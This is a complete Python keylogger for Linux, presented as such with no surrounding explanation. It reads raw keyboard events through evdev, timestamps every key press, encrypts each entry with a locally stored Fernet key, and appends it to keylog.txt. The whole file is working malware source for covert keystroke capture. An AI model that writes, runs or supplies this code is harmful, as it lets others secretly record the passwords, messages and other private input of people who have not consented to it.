from evdev import InputDevice, categorize, ecodes
from datetime import datetime
from cryptography.fernet import Fernet
import os
import threading
import signal
import sys

# Generate encryption key (only once and save it securely)
if not os.path.exists("key.key"):
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)
else:
    with open("key.key", "rb") as key_file:
        key = key_file.read()

cipher = Fernet(key)
LOG_FILE = "keylog.txt"


def get_keyboard_device():
    devices = [InputDevice(fn) for fn in ["/dev/input/event{}".format(i) for i in range(5)]]
    for dev in devices:
        if "keyboard" in dev.name.lower():
            return dev.path
    raise Exception("No keyboard found")


def log_key(key_event):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] {key_event}\n"
    encrypted_data = cipher.encrypt(log_entry.encode())

    with open(LOG_FILE, "ab") as f:
        f.write(encrypted_data + b"\n")


def handle_key_event(event):
    if event.type == ecodes.EV_KEY:
        key_event = categorize(event)
        key = key_event.keycode

        if isinstance(key, list):
            key = key[0]

        if event.value == 1:  # Key press
            log_key(key)


def monitor_keyboard():
    device = InputDevice(get_keyboard_device())
    print(f"Monitoring: {device.name}")

    try:
        for event in device.read_loop():
            handle_key_event(event)
    except KeyboardInterrupt:
        print("\n[+] Keylogger stopped.")


def signal_handler(sig, frame):
    print("\n[+] Exiting program...")
    sys.exit(0)


signal.signal(signal.SIGINT, signal_handler)

if __name__ == "__main__":
    threading.Thread(target=monitor_keyboard).start()
